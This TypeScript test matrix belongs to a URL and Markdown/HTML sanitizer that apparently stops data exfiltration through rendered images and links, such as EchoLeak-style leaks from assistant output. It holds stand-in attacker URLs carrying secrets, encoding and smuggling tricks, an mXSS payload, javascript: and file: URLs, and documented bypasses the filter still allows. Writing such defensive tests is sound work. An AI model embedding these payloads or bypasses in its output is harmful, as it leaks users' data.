// Data: the URL and vector test matrix. T-xx = SPEC.md section 14.1, E-xx = extra edge cases,
// L-xx = documented limitations (these MUST be allowed today; they record what we do not catch),
// X-xx = extra sanitizer-level cases.
//
// Two kinds of check per row:
//  - evaluator: the URL string exactly as the Markdown/HTML parser would hand it over (already
//    entity-decoded), the vector it came from, and the expected verdict.
//  - sanitize: raw Markdown/HTML in, expected output. Outputs are PROVISIONAL until the serializers
//    exist (compare after trimming trailing whitespace); reconcile any formatting difference by
//    amending SPEC.md, never by loosening the security meaning of a row.
import type { PolicyName } from "../helpers/matrix-policy";
import type { RejectReason } from "../../src/types/reject-reason";
import type { Vector } from "../../src/types/vector";

export type Expect =
  | { allow: true; canonical: string }
  | { allow: false; reason: RejectReason };

export type SanitizeExpect =
  | { kind: "text"; output: string }
  | { kind: "dropped" }
  | { kind: "invariants"; mustNotContain: string[] };

export interface EvaluatorCheck {
  url: string;
  vector: Vector;
  policy: PolicyName;
  expect: Expect;
  /** Steps this row materially exercises even though it is not a rejection (for allow rows). */
  exercises?: number[];
}

export interface SanitizeCheck {
  input: string;
  policy: PolicyName;
  expect: SanitizeExpect;
}

export interface UrlCase {
  id: string;
  title: string;
  category: "spec" | "extra" | "limitation";
  evaluator?: EvaluatorCheck;
  sanitize?: SanitizeCheck;
}

const ok = (canonical: string): Expect => ({ allow: true, canonical });
const no = (reason: RejectReason): Expect => ({ allow: false, reason });
const text = (output: string): SanitizeExpect => ({ kind: "text", output });

/** True if a URL can be written inside a Markdown link destination without escaping. */
const mdSafe = (url: string): boolean => /^[^\s()<>\\]+$/.test(url);

interface RowOptions {
  vector?: Vector;
  policy?: PolicyName;
  exercises?: number[];
  sanitize?: SanitizeCheck | null;
}

/** An evaluator row whose sanitize row is derived as a Markdown image. */
function img(
  id: string,
  title: string,
  url: string,
  expect: Expect,
  category: UrlCase["category"] = "spec",
  options: RowOptions = {}
): UrlCase {
  const policy = options.policy ?? "matrix";
  const evaluator: EvaluatorCheck = {
    url,
    vector: options.vector ?? "markdown_image",
    policy,
    expect,
    ...(options.exercises ? { exercises: options.exercises } : {})
  };
  const derived: SanitizeCheck | undefined =
    options.sanitize === null || !mdSafe(url)
      ? undefined
      : {
          input: `![a](${url})`,
          policy,
          expect: text(expect.allow ? `![a](${expect.canonical})` : "")
        };
  const sanitize = options.sanitize ?? derived;
  return { id, title, category, evaluator, ...(sanitize ? { sanitize } : {}) };
}

/** An evaluator-only row. */
function ev(
  id: string,
  title: string,
  url: string,
  expect: Expect,
  options: RowOptions & { category?: UrlCase["category"] } = {}
): UrlCase {
  return img(id, title, url, expect, options.category ?? "extra", { ...options, sanitize: null });
}

/** A sanitizer-only row. */
function san(
  id: string,
  title: string,
  input: string,
  expect: SanitizeExpect,
  category: UrlCase["category"] = "spec",
  policy: PolicyName = "matrix"
): UrlCase {
  return { id, title, category, sanitize: { input, policy, expect } };
}

const GH = "https://github.com/my-org/assets";
const AS = "https://api.corp.internal/chart/1";
const ST = "static.internal";

export const URL_CASES: UrlCase[] = [
  // ───────────────────────── SPEC.md section 14.1 ─────────────────────────
  {
    ...img("T-01", "Canonical emit: host lowercased, fragment stripped",
      "HTTPS://GITHUB.COM/my-org/assets/logo.png#frag", ok(`${GH}/logo.png`), "spec",
      { exercises: [11, 13], sanitize: null }),
    sanitize: {
      input: "Hello ![logo](HTTPS://GITHUB.COM/my-org/assets/logo.png#frag)",
      policy: "matrix",
      expect: text(`Hello ![logo](${GH}/logo.png)`)
    }
  },
  {
    ...img("T-02", "Untrusted host (EchoLeak style)", "https://attacker.com/log?d=SECRET",
      no("host_not_allowed"), "spec", { sanitize: null }),
    sanitize: {
      input: "Summary: ![a](https://attacker.com/log?d=SECRET)",
      policy: "matrix",
      expect: text("Summary: ")
    }
  },
  img("T-03", "Dot traversal resolves outside the allowed prefix",
    `${GH}/../../evil/leak.png`, no("path_not_allowed")),
  img("T-04", "Encoded slash differential", `${GH}/..%2fevil/leak.png`, no("illegal_delimiter")),
  img("T-05", "Query blocked by default", `${GH}/p.png?v=1`, no("query_not_allowed")),
  img("T-06", "Chunked query smuggling", `${AS}?theme=a&s1=SE&s2=CR`, no("query_param_not_allowed")),
  {
    id: "T-07",
    title: "Entity-encoded tab in an HTML attribute (parse5 decodes; evaluator strips)",
    category: "spec",
    evaluator: {
      url: ` \thttps://github.com/my-org/assets/ok.png `,
      vector: "html_img_src",
      policy: "matrix",
      expect: ok(`${GH}/ok.png`),
      exercises: [2]
    },
    sanitize: {
      input: `<ImG sRc=" &#x09;ht&#x74;ps://github.com/my-org/assets/ok.png ">`,
      policy: "matrix",
      expect: text(`<img src="${GH}/ok.png">`)
    }
  },
  {
    ...img("T-08a", "Zero-width space delivered by an entity (Markdown decodes it)",
      `${GH}/a\u200B.png`, no("illegal_char"), "spec", { sanitize: null }),
    sanitize: { input: `![a](${GH}/a&#x200B;.png)`, policy: "matrix", expect: text("") }
  },
  san("T-08b", "Raw zero-width space in the destination", `![a](${GH}/a\u200B.png)`, text("")),
  img("T-09", "Double percent-encoding", `${AS}?theme=%253A%252F%252F`, no("illegal_delimiter")),
  img("T-10", "Explicit non-default port", "https://github.com:8080/my-org/assets/logo.png",
    no("port_not_allowed")),
  img("T-11", "Base64 label under an explicit-subdomain host",
    `https://U0VDUkVUX0RBVEE.${ST}/img/a.png`, no("subdomain_not_allowed")),
  img("T-12a", "Long lowercase label", `https://secretdataexfil123.${ST}/img/a.png`,
    no("subdomain_not_allowed")),
  img("T-12b", "Lowercase base32 label", `https://mfrggzdfmz.${ST}/img/a.png`,
    no("subdomain_not_allowed")),
  img("T-12c", "Listed subdomain is allowed", `https://cdn.${ST}/img/a.png`,
    ok(`https://cdn.${ST}/img/a.png`), "spec", { exercises: [10] }),
  img("T-13", "Base64 filename", `${GH}/U0VDUkVUX0RBVEE.png`, no("base64_signature")),
  img("T-14", "False-positive guard: long hyphenated filename",
    `${GH}/architecture-overview-diagram.png`, ok(`${GH}/architecture-overview-diagram.png`),
    "spec", { exercises: [14] }),
  san("T-15", "srcset is not an allowed attribute",
    `<img src="${GH}/ok.png" srcset="https://evil.com/leak 2x">`, text(`<img src="${GH}/ok.png">`)),
  san("T-16", "<base> and <link> are dropped",
    `<base href="https://evil.com"><link rel="dns-prefetch" href="//evil.com">`, text("")),
  san("T-17", "style attribute and SVG are removed",
    `<div style="background:url(https://evil.com/x)"><svg><use href="https://evil.com/s#i"/></svg></div>`,
    text("<div></div>")),
  san("T-18", "Markdown inside an attribute is inert; title is not allowed on div",
    `<div title="![a](https://evil.com/x)">Hello`, text("<div>Hello</div>")),
  san("T-19", "mXSS payload: golden output pinned at implementation",
    `<svg><style><img src="</style><img src=https://evil.com/x>"></style></svg>`,
    { kind: "invariants", mustNotContain: ["evil.com", "<svg", "<style", "<img"] }),
  san("T-20a", "Mermaid fence becomes inert",
    '```mermaid\ngraph TD;\nclick A "https://evil.com"\n```',
    text('```text\ngraph TD;\nclick A "https://evil.com"\n```')),
  san("T-20b", "KaTeX URL macro removed", "$$\\href{https://evil.com/leak}{x^2}$$", text("")),
  img("T-21", "Path chunking: * is one segment", `${GH}/SE/CR/ET.png`, no("path_not_allowed")),
  img("T-22", "Path parameter (;)", `${GH}/a.png;x=1`, no("illegal_delimiter")),
  img("T-23", "Bidi override character in the path", `${GH}/a\u202E.png`, no("illegal_char")),
  san("T-24", "iframe srcdoc: iframe dropped with content",
    `<iframe srcdoc="<img src=https://evil.com/x>"></iframe>`, text("")),
  img("T-25", "Residual entity after the parser decoded one layer",
    `${GH}/a&#x2e;png`, no("double_encoded"), "spec",
    { sanitize: { input: `![a](${GH}/a&amp;#x2e;png)`, policy: "matrix", expect: text("") } }),
  {
    id: "T-26",
    title: "Bare www autolink is defanged (GFM hands over http://www...)",
    category: "spec",
    evaluator: {
      url: "http://www.attacker.com/x?d=SECRET",
      vector: "markdown_autolink",
      policy: "matrix",
      expect: no("scheme_not_allowed")
    },
    sanitize: {
      input: "see www.attacker.com/x?d=SECRET",
      policy: "matrix",
      expect: text("see `www[.]attacker[.]com/x?d=SECRET`")
    }
  },
  {
    id: "T-27",
    title: "Untrusted link is defanged",
    category: "spec",
    evaluator: {
      url: "https://evil.com/x?d=S",
      vector: "markdown_link",
      policy: "matrix",
      expect: no("host_not_allowed")
    },
    sanitize: {
      input: "[click](https://evil.com/x?d=S)",
      policy: "matrix",
      expect: text("click (`hxxps://evil[.]com/x?d=S`)")
    }
  },
  {
    id: "T-28",
    title: "javascript: link becomes text only",
    category: "spec",
    evaluator: {
      url: "javascript:alert(1)",
      vector: "html_a_href",
      policy: "matrix",
      expect: no("scheme_not_allowed")
    },
    sanitize: { input: '<a href="javascript:alert(1)">x</a>', policy: "matrix", expect: text("x") }
  },
  img("T-29", "Decimal IPv4 host", "https://2130706433/x.png", no("ip_host")),
  img("T-30", "Trailing-dot host", "https://github.com./my-org/assets/a.png", no("trailing_dot_host")),
  img("T-31", "Credentials trick", "https://github.com@attacker.com/my-org/assets/a.png",
    no("credentials_present")),
  {
    id: "T-32",
    title: "Protocol-relative URL to an untrusted host",
    category: "spec",
    evaluator: {
      url: "//attacker.com/x.png",
      vector: "html_img_src",
      policy: "matrix",
      expect: no("host_not_allowed")
    },
    sanitize: { input: '<img src="//attacker.com/x.png">', policy: "matrix", expect: text("") }
  },
  {
    id: "T-33",
    title: "Forward-reference definition to an untrusted host is removed",
    category: "spec",
    evaluator: {
      url: "https://evil.com/x",
      vector: "markdown_definition",
      policy: "matrix",
      expect: no("host_not_allowed")
    },
    sanitize: {
      input: "![a][1]\n\n[1]: https://evil.com/x",
      policy: "matrix",
      expect: text("![a][1]")
    }
  },
  {
    id: "T-34",
    title: "Allowed definition is emitted canonically",
    category: "spec",
    evaluator: {
      url: "HTTPS://GITHUB.COM/my-org/assets/a.png",
      vector: "markdown_definition",
      policy: "matrix",
      expect: ok(`${GH}/a.png`)
    },
    sanitize: {
      input: "![a][1]\n\n[1]: HTTPS://GITHUB.COM/my-org/assets/a.png",
      policy: "matrix",
      expect: text(`![a][1]\n\n[1]: ${GH}/a.png`)
    }
  },
  san("T-35", "Depth bomb: 100 nested blockquotes drops the message",
    `${"> ".repeat(100)}x`, { kind: "dropped" }),

  // ───────────────────────── Extra evaluator cases ─────────────────────────
  // Relative and protocol-relative URLs (step 5)
  ev("E-01", "Relative URL without a __relative__ rule", "/img/a.png", no("relative_not_allowed"),
    { vector: "html_img_src" }),
  ev("E-02", "Absolute-path relative URL with a __relative__ rule", "/icons/a.png", ok("/icons/a.png"),
    { vector: "html_img_src", policy: "extra", exercises: [5] }),
  ev("E-03", "Relative traversal leaves the allowed path", "/icons/../secret/a.png",
    no("path_not_allowed"), { vector: "html_img_src", policy: "extra" }),
  ev("E-04", "Path-relative URL is never allowed (depends on the page URL)", "icons/a.png",
    no("relative_not_allowed"), { vector: "html_img_src", policy: "extra" }),
  ev("E-05", "Empty string is treated as relative", "", no("relative_not_allowed")),
  ev("E-06", "Protocol-relative URL to an allowed host", "//github.com/my-org/assets/logo.png",
    ok(`${GH}/logo.png`), { vector: "html_img_src", exercises: [5] }),
  ev("E-07", "Triple slash resolves to an untrusted host", "///attacker.com/x.png",
    no("host_not_allowed"), { vector: "html_img_src" }),
  ev("E-08", "https:/// resolves to an untrusted host", "https:///attacker.com/x.png",
    no("host_not_allowed")),
  // Parsing (step 6): the WHATWG parser is lenient, so canonical output matters.
  ev("E-09", "Single slash after the scheme is accepted by browsers", "https:/github.com/my-org/assets/logo.png",
    ok(`${GH}/logo.png`), { exercises: [6] }),
  ev("E-10", "No slashes after the scheme is accepted by browsers", "https:github.com/my-org/assets/logo.png",
    ok(`${GH}/logo.png`), { exercises: [6] }),
  ev("E-11", "Missing host", "https://", no("parse_failed")),
  ev("E-12", "Unterminated IPv6 literal", "https://[::1", no("parse_failed")),
  // Scheme (step 7)
  ev("E-13", "http rejected by default", "http://github.com/my-org/assets/logo.png", no("scheme_not_allowed")),
  ev("E-14", "http allowed when the policy enables it", "http://github.com/my-org/assets/logo.png",
    ok("http://github.com/my-org/assets/logo.png"), { policy: "extra" }),
  ev("E-15", "data: URL", "data:text/html,hello", no("scheme_not_allowed")),
  ev("E-16", "data: base64 URL is stopped earlier by the ; rule", "data:image/png;base64,AAAA",
    no("illegal_delimiter")),
  ev("E-17", "blob: URL", "blob:https://github.com/uuid", no("scheme_not_allowed")),
  ev("E-18", "file: URL", "file:///etc/passwd", no("scheme_not_allowed")),
  ev("E-19", "ws: URL", "ws://github.com/x", no("scheme_not_allowed")),
  ev("E-20", "vbscript: URL", "vbscript:x", no("scheme_not_allowed")),
  // Authority (step 8)
  ev("E-21", "IPv6 literal", "https://[::1]/x.png", no("ip_host")),
  ev("E-22", "Dotted-quad IPv4", "https://127.0.0.1/x.png", no("ip_host")),
  ev("E-23", "Hex IPv4 normalizes to 127.0.0.1", "https://0x7f.1/x.png", no("ip_host")),
  ev("E-24", "Username only", "https://user@github.com/my-org/assets/a.png", no("credentials_present")),
  ev("E-25", "Username and password", "https://user:pass@github.com/my-org/assets/a.png",
    no("credentials_present")),
  // Port (step 9)
  ev("E-26", "Default port is elided by the parser", "https://github.com:443/my-org/assets/a.png",
    ok(`${GH}/a.png`), { exercises: [9] }),
  ev("E-27", "Explicitly allowlisted host:port", "http://localhost:8080/dev/a.png",
    ok("http://localhost:8080/dev/a.png"), { policy: "extra", exercises: [9] }),
  ev("E-28", "Other port on that host", "http://localhost:9090/dev/a.png", no("port_not_allowed"),
    { policy: "extra" }),
  ev("E-29", "Same host without the port", "http://localhost/dev/a.png", no("host_not_allowed"),
    { policy: "extra" }),
  // Host and subdomains (step 10)
  ev("E-30", "Open wildcard: one safe label", "https://x.wild.example.net/w/a.png",
    ok("https://x.wild.example.net/w/a.png"), { policy: "extra" }),
  ev("E-31", "Open wildcard: label of 17 characters", "https://abcdefghijklmnopq.wild.example.net/w/a.png",
    no("subdomain_not_allowed"), { policy: "extra" }),
  ev("E-32", "Open wildcard: two extra levels", "https://a.b.wild.example.net/w/a.png",
    no("subdomain_not_allowed"), { policy: "extra" }),
  ev("E-33", "Open wildcard: all-hex label of 10 characters", "https://deadbeef12.wild.example.net/w/a.png",
    no("subdomain_not_allowed"), { policy: "extra" }),
  ev("E-34", "Open wildcard: two hyphens", "https://a-b-c.wild.example.net/w/a.png",
    no("subdomain_not_allowed"), { policy: "extra" }),
  ev("E-35", "The wildcard's own host", "https://wild.example.net/w/a.png",
    ok("https://wild.example.net/w/a.png"), { policy: "extra" }),
  ev("E-36", "Lookalike prefix", "https://evilgithub.com/my-org/assets/a.png", no("host_not_allowed")),
  ev("E-37", "Allowed host as a prefix of another", "https://github.com.evil.com/my-org/assets/a.png",
    no("host_not_allowed")),
  ev("E-38", "Suffix without a dot boundary", `https://notstatic.internal/img/a.png`, no("host_not_allowed")),
  // Path (step 11)
  ev("E-39", "Character outside the segment set (parser percent-encodes the quote)", `${GH}/a"b.png`,
    no("path_charset")),
  ev("E-40", "Tilde is outside the segment set", `${GH}/a~b.png`, no("path_charset")),
  ev("E-41", "Six segments is the allowed depth", "https://deep.example.org/d/a/b/c/d/e.png",
    ok("https://deep.example.org/d/a/b/c/d/e.png"), { policy: "extra", exercises: [11] }),
  ev("E-42", "Seven segments exceeds max_path_depth", "https://deep.example.org/d/a/b/c/d/e/f.png",
    no("path_too_deep"), { policy: "extra" }),
  ev("E-43", "Segment of 65 characters", `https://deep.example.org/d/${"a".repeat(65)}.png`,
    no("path_charset"), { policy: "extra" }),
  ev("E-44", "Very long input is rejected quickly", `${GH}/${"a".repeat(100_000)}.png`, no("path_charset")),
  // Query (step 12)
  ev("E-45", "Allowed parameters", `${AS}?theme=dark&size=big`, ok(`${AS}?theme=dark&size=big`),
    { exercises: [12] }),
  ev("E-46", "Parameter order is preserved", `${AS}?size=big&theme=dark`, ok(`${AS}?size=big&theme=dark`)),
  ev("E-47", "Duplicate parameter", `${AS}?theme=a&theme=b`, no("query_param_duplicate")),
  ev("E-48", "Value of 11 characters (limit 10)", `${AS}?theme=abcdefghijk`, no("query_value_invalid")),
  ev("E-49", "Colon in a value", `${AS}?theme=a:b`, no("query_value_invalid")),
  ev("E-50", "Parameter names are case-sensitive", `${AS}?Theme=a`, no("query_param_not_allowed")),
  ev("E-51", "Trailing ampersand (empty pair)", `${AS}?theme=a&`, no("query_value_invalid")),
  ev("E-52", "Empty value is allowed", `${AS}?theme=`, ok(`${AS}?theme=`)),
  ev("E-53", "Semicolon separator hides a second parameter", `${AS}?theme=a;size=b`, no("query_value_invalid")),
  ev("E-54", "Plus sign in a value", `${AS}?theme=a+b`, no("query_value_invalid")),
  ev("E-55", "Empty query (?) when queries are not allowed", `${GH}/logo.png?`, no("query_not_allowed")),
  ev("E-56", "Empty query (?) when queries are allowed", `${AS}?`, no("query_value_invalid")),
  // Fragment (step 13)
  ev("E-57", "Empty fragment is removed", `${GH}/logo.png#`, ok(`${GH}/logo.png`), { exercises: [13] }),
  ev("E-58", "Fragment is kept for link vectors", `${GH}/logo.png#top`, ok(`${GH}/logo.png#top`),
    { vector: "markdown_link", exercises: [13] }),
  ev("E-59", "Autolink to an allowed URL", `${GH}/logo.png`, ok(`${GH}/logo.png`),
    { vector: "markdown_autolink" }),
  // Heuristics (step 14)
  ev("E-60", "Total length above the host's max_uri_length (60)",
    "https://long.example.org/l/abcdefghijklmnopqrstuvwxyz0123456789.png", no("uri_too_long"),
    { policy: "extra" }),
  ev("E-61", "Hex run of 32 characters", `${GH}/0123456789abcdef0123456789abcdef.png`, no("hex_run")),
  ev("E-62", "Long hex allowed when allow_uuid_or_sha_paths is set",
    "https://blobs.example.org/blob/0123456789abcdef0123456789abcdef01234567",
    ok("https://blobs.example.org/blob/0123456789abcdef0123456789abcdef01234567"), { policy: "extra" }),
  ev("E-63", "High entropy lowercase token", `${GH}/qwertyuiopasdfghjklzxcvbnm.png`, no("high_entropy")),
  ev("E-64", "Short hex is fine", `${GH}/deadbeef.png`, ok(`${GH}/deadbeef.png`)),
  ev("E-65", "Legitimate long names stay under the entropy limit", `${GH}/quarterly-revenue-summary-2026.png`,
    ok(`${GH}/quarterly-revenue-summary-2026.png`)),
  // Entities, trimming, characters, delimiters (steps 1 to 4)
  ev("E-66", "Residual named entity", `${GH}/a&amp;b.png`, no("double_encoded")),
  ev("E-67", "Surrounding spaces are trimmed", `  ${GH}/logo.png  `, ok(`${GH}/logo.png`), { exercises: [2] }),
  ev("E-68", "Newline inside the URL is removed", `${GH}/lo\ngo.png`, ok(`${GH}/logo.png`), { exercises: [2] }),
  ev("E-69", "Tab inside the host is removed", "https://git\thub.com/my-org/assets/logo.png",
    ok(`${GH}/logo.png`), { exercises: [2] }),
  ev("E-70", "Leading C0 control character is trimmed", `\u0001${GH}/logo.png`, ok(`${GH}/logo.png`),
    { exercises: [2] }),
  ev("E-71", "Control character inside the URL", `https://github.com/my-org/\u0001assets/logo.png`,
    no("illegal_char")),
  ev("E-72", "DEL character", `${GH}/a\u007f.png`, no("illegal_char")),
  ev("E-73", "Leading no-break space is not trimmed by browsers", `\u00a0${GH}/logo.png`, no("illegal_char")),
  ev("E-74", "Non-ASCII lookalike host", "https://g\u0131thub.com/my-org/assets/logo.png", no("illegal_char")),
  ev("E-75", "Space inside the URL", `${GH}/a b.png`, no("illegal_char")),
  ev("E-76", "Backslashes are slashes to browsers", "https://github.com\\my-org\\assets\\logo.png",
    no("illegal_delimiter")),
  ev("E-77", "Percent-encoding in the host", "https://g%69thub.com/my-org/assets/logo.png",
    no("illegal_delimiter")),
  ev("E-78", "Encoded dot-segments", `${GH}/%2e%2e/assets/x.png`, no("illegal_delimiter")),
  ev("E-79", "HTML anchor to an allowed URL keeps its fragment", `${GH}/logo.png#top`, ok(`${GH}/logo.png#top`),
    { vector: "html_a_href" }),

  // ───────────────────────── Documented limitations ─────────────────────────
  // These are allowed today because they fit inside a permitted shape. They record what the
  // heuristics do NOT catch, so a change in behavior (better or worse) is noticed.
  ev("L-01", "LIMITATION: 10-character Base64 chunk fits a permitted query value",
    `${AS}?theme=U0VDUkVUX0`, ok(`${AS}?theme=U0VDUkVUX0`), { category: "limitation" }),
  ev("L-02", "LIMITATION: 2-character chunk in a filename", `${GH}/SE.png`, ok(`${GH}/SE.png`),
    { category: "limitation" }),
  ev("L-03", "LIMITATION: short lowercase base32 filename", `${GH}/mfrggzdfmz.png`, ok(`${GH}/mfrggzdfmz.png`),
    { category: "limitation" }),

  // ───────────────────────── Extra sanitizer-level cases ─────────────────────────
  san("X-01", "Event handler attribute is removed",
    `<img src="${GH}/ok.png" onerror="alert(1)">`, text(`<img src="${GH}/ok.png">`), "extra"),
  san("X-02", "script is dropped with its content", "<script>alert(1)</script>", text(""), "extra"),
  san("X-03", "Image syntax inside a code span is inert", "Use `![a](https://evil.com/x)` syntax",
    text("Use `![a](https://evil.com/x)` syntax"), "extra"),
  san("X-04", "Image syntax inside a code fence is inert", "```\n![a](https://evil.com/x)\n```",
    text("```\n![a](https://evil.com/x)\n```"), "extra"),
  san("X-05", "Ordinary punctuation is left alone", "Hello! See [1] for details.",
    text("Hello! See [1] for details."), "extra"),
  san("X-06", "style attribute removed from an allowed element",
    `<img src="${GH}/ok.png" style="background:url(https://evil.com/x)">`, text(`<img src="${GH}/ok.png">`),
    "extra"),
  san("X-07", "picture and source are dropped with their content",
    `<picture><source srcset="https://evil.com/x"><img src="${GH}/ok.png"></picture>`, text(""), "extra"),
  san("X-08", "Allowed Markdown link is unchanged", `[docs](${GH}/logo.png)`, text(`[docs](${GH}/logo.png)`),
    "extra"),
  san("X-09", "Allowed HTML link is unchanged", `<a href="${GH}/logo.png">logo</a>`,
    text(`<a href="${GH}/logo.png">logo</a>`), "extra"),
  san("X-10", "Inline math without URL macros is unchanged", "Area is $x^2$ here.",
    text("Area is $x^2$ here."), "extra")
];
